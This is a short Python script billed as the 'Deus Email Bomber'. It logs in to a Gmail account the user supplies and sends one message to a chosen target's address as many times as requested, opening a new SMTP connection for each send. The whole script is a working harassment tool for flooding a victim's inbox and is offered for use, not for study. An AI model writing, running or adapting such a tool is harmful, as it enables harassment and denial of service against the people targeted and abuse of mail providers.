# Coded By Deus
import smtplib
import getpass
from email.mime.text import MIMEText

print("\033[1;32;40m\n""""{}

██████╗░███████╗██╗░░░██╗░██████╗
██╔══██╗██╔════╝██║░░░██║██╔════╝
██║░░██║█████╗░░██║░░░██║╚█████╗░
██║░░██║██╔══╝░░██║░░░██║░╚═══██╗
██████╔╝███████╗╚██████╔╝██████╔╝
╚═════╝░╚══════╝░╚═════╝░╚═════╝░

███████╗███╗░░░███╗░█████╗░██╗██╗░░░░░
██╔════╝████╗░████║██╔══██╗██║██║░░░░░
█████╗░░██╔████╔██║███████║██║██║░░░░░
██╔══╝░░██║╚██╔╝██║██╔══██║██║██║░░░░░
███████╗██║░╚═╝░██║██║░░██║██║███████╗
╚══════╝╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝╚══════╝

██████╗░░█████╗░███╗░░░███╗██████╗░███████╗██████╗░
██╔══██╗██╔══██╗████╗░████║██╔══██╗██╔════╝██╔══██╗
██████╦╝██║░░██║██╔████╔██║██████╦╝█████╗░░██████╔╝
██╔══██╗██║░░██║██║╚██╔╝██║██╔══██╗██╔══╝░░██╔══██╗
██████╦╝╚█████╔╝██║░╚═╝░██║██████╦╝███████╗██║░░██║
╚═════╝░░╚════╝░╚═╝░░░░░╚═╝╚═════╝░╚══════╝╚═╝░░╚═╝
                                                                                                                                   
{}\n\t[+] Welcome To Deus Email Bomber  /\n\t[+] *Ctrl + c To Stop*\n\t[+] https://github.com/deuscheating \n{}""".format("="*100,"="*100,"="*100))

server = smtplib.SMTP_SSL("smtp.gmail.com", 465)

try:
    emaillogin = input("[+] Enter Your Email Here --> ")
    passwordlogin = getpass.getpass("[+] Enter Your Password Here --> ")
    email = input("[+] Enter Your Targets Email Here --> ")
    emailnum = int(input("[+] Enter The Number Of Emails You Want To Send Here --> "))
    sub = input("[+] Enter Your Subject Here --> ")
    message = input("[+] Enter Your Message Here --> ")
    print("="*100)
    
    for i in range(0, emailnum):
        msg = MIMEText(f"{message}")
        msg['Subject'] = f'{sub}'
        server = smtplib.SMTP_SSL("smtp.gmail.com", 465)
        server.login(f"{emaillogin}", f"{passwordlogin}")
        receivers = [f"{email}"]
        server.sendmail(f"{emaillogin}", receivers, msg.as_string())
        print("[+] Message Sent")

except smtplib.SMTPAuthenticationError:
	print("\n[!] Either Your Email Or Password Is Incorrect Or Enable Less Secure Apps\n[+] Exiting...\n")

except smtplib.SMTPRecipientsRefused:
	print("\n[!] Your Targets Email Is Incorrect Try Again\n[+] Exiting...\n")

except ValueError:
	print("\n[!] The Number Of Emails You Requested To Send Is Invalid\n[+] Exiting...\n")

except KeyboardInterrupt:
    print("\n[+] Exiting...\n")

server.quit()
